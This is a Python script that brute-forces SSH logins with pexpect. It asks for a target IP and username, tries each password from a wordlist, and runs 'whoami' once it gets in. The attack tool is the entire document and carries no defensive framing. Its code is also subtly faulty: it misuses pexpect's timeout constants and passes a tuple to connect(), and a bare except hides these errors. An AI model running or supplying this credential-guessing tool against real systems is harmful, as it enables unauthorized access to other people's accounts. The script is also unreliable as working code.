#!/usr/bin/python3

import pexpect
from termcolor import colored

PROMPT = ['# ', '>>> ', '> ', '\$ ']

def send_command(child, command):
    child.sendline(command)
    child.expect(PROMPT)
    print(child.before)

def connect(user, host, password):
    ssh_newkey = 'Are you sure you want to continue connecting'
    connStr = 'ssh ' + user + '@' + host
    Child = pexpect.spawn(connStr)
    ret = Child.expect([pexpect.Timeout, ssh_newkey, '[P|p]assword: '])
    if ret == 0:
        print("[-] Error connecting")
        return
    if ret == 1:
        Child.sendline('yes')
        ret = Child.expect([pexpect.TIMEOUT(1), '[P|p]assword: '])
        if ret == 0:
            print('[-] Error connecting')
            return
    Child.sendline(password)
    Child.expect(PROMPT, timeout=1.0)
    return Child


def main():
    host = input("Enter IP address of Target to brute force: ")
    user = input("Enter user account you want to bruteforce: ")
    file = open('password.txt', 'r')
    for password in file.readlines():
        password = password.strip('\n')
        try:
            Child = connect((user, host, password))
            print("[+] password found " + password)
            send_command(Child, 'whoami')
        except:
            print("[-] Wrong password " + password)


if __name__ == "__main__":
    main()
